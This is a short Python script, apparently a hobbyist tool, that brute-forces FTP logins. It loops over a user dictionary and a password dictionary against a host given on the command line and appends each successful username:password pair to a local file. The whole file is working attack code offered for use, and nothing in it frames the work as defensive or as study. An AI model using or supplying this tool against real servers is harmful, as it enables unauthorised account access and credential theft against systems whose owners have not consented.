#!/usr/bin/python

import optparse
import ftplib


def Credentials_found(user,password):
	file = "ftp_creds_found"
	file1 = open(file, "a")
	credentials =  file1.writelines( user + ":" + password + "\n")


def Cracking_FTP(ip, user, password):
	ftp = ftplib.FTP(ip)
	try:
		ftp.login(user, password)
		ftp.quit()
		print("Credentials Found: {}:{}".format(user,password))
		Credentials_found(user, password)

	except:
		print("Credentials not found")


def Read_Dictionary(ip, user, password):
	ip_addr = ip
	users = open(user,"r")
	users = users.read().split("\n")

	passwords = open(password, "r")
	passwords = passwords.read().split("\n")

	for user_line in users:
		for pass_line in passwords:
			Cracking_FTP(ip_addr, user_line, pass_line)


def main():
	parser = optparse.OptionParser("./Program.py -H <FTP Server> -U <User_Dictionary> - P <Pasword_Dictionary>")
	parser.add_option("-H", dest="Ip_Address", type="string", help="Specify the ip address")
	parser.add_option("-U", dest="User_file", type="string", help="Specify the user dictionary file")
	parser.add_option("-P", dest="Password_file", type="string", help="Specify the password dictionary file")

	(options,args) = parser.parse_args()
	IpHost = options.Ip_Address
	User_dic = options.User_file
	Pass_dic = options.Password_file

	if(IpHost == None) | (User_dic == None) | (Pass_dic == None):
		parser.print_help()
		print ""
		exit(0)

	Read_Dictionary(IpHost, User_dic, Pass_dic)

if __name__ == '__main__':
	main()